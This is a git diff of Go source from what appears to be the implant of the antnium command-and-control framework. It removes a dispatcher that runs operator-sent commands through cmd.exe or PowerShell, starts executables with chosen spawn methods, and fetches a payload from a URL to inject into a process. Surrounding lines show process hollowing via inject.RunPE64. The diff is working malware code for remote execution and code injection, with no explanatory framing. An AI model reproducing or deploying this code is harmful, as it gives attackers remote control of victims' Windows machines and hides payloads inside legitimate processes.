@@ -9,7 +9,6 @@ extern int Technique1();
 import "C"
 
 import (
-	"fmt"
 	"io"
 	"os"
 	"os/exec"
@@ -22,7 +21,6 @@ import (
 	fp "path/filepath"
 
 	"github.com/dobin/antnium/pkg/inject"
-	"github.com/dobin/antnium/pkg/model"
 	log "github.com/sirupsen/logrus"
 	"golang.org/x/sys/windows"
 	"golang.org/x/text/encoding/charmap"
@@ -107,92 +105,6 @@ func hollow(source, replace, name string, args []string) (int, []byte, []byte, i
 	//log.Infof("Replacing %s with %s", source, replace)
 	data, _ := ioutil.ReadFile(replace)
 	return inject.RunPE64(data, source, name, strings.Join(args, " "))
-}
-
-func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
-	shellType, ok := packetArgument["shelltype"]
-	if !ok {
-		return stdOut, stdErr, pid, exitCode, fmt.Errorf("no argument 'shelltype' given")
-	}
-
-	// Parse packet so we get all the things we need
-	switch shellType {
-	case "cmd":
-		commandStr, ok := packetArgument["commandline"]
-		if !ok {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no commandline")
-		}
-		return execCmdExe(commandStr)
-
-	case "powershell":
-		commandStr, ok := packetArgument["commandline"]
-		if !ok {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no commandline")
-		}
-		return execPowershell(commandStr)
-
-	case "commandexec":
-		executable, ok := packetArgument["executable"]
-		if !ok {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no executable")
-		}
-		argline, ok := packetArgument["argline"]
-		if !ok {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no argline")
-		}
-		args := strings.Fields(argline)
-
-		spawnType, ok := packetArgument["spawnType"]
-		if !ok {
-			spawnType = "standard"
-		}
-		spawnData, ok := packetArgument["spawnData"]
-		if !ok {
-			spawnData = ""
-		}
-
-		return execDirect(executable, args, spawnType, spawnData)
-
-	case "raw":
-		executable, args, err := model.MakePacketArgumentFrom(packetArgument)
-		executable = ResolveWinVar(executable)
-		if err != nil {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given")
-		}
-
-		spawnType, ok := packetArgument["spawnType"]
-		if !ok {
-			spawnType = "standard"
-		}
-		spawnData, ok := packetArgument["spawnData"]
-		if !ok {
-			spawnData = ""
-		}
-
-		return execDirect(executable, args, spawnType, spawnData)
-
-	case "remote":
-		url, ok := packetArgument["url"]
-		if !ok {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no url")
-		}
-		fileType, ok := packetArgument["type"]
-		if !ok {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no type")
-		}
-		argline, ok := packetArgument["argline"]
-		if !ok {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no argline")
-		}
-		injectInto, ok := packetArgument["injectInto"]
-		if !ok {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no injectInto")
-		}
-		return execRemote(url, fileType, argline, injectInto)
-
-	default:
-		return stdOut, stdErr, pid, exitCode, fmt.Errorf("shelltype %s unkown a", shellType)
-	}
 }
 
 func execIt(cmd *exec.Cmd) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
